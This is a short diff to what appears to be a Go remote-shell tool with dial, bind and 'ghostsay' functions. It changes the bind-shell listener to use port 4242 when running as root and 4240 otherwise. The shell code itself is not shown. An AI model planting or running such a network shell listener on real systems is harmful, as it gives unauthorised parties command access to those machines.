@@ -62,7 +62,6 @@ func dial(host string, port int) {
 
 
 // bind listens on the specified tcp port and provides a shell
-// TODO: Use port 4242 for root shells, 4240 for non root.
 func bind(port int) {
 	// Start listening on the specified tcp port
 	l, e := net.Listen("tcp", fmt.Sprintf(":%d", port))
@@ -210,7 +209,12 @@ func main() {
 			dial(os.Args[i+1], port)
 			i += 2
 			case "--bind": // --bind
-			bind(4242)
+			// Use port 4242 for root shells and 4240 otherwise
+			port := 4242
+			if os.Getuid() != 0 {
+				port = 4240
+			}
+			bind(port)
 			case "--say": // --say <message>
 			ghostsay(os.Args[i+1])
 			i += 1
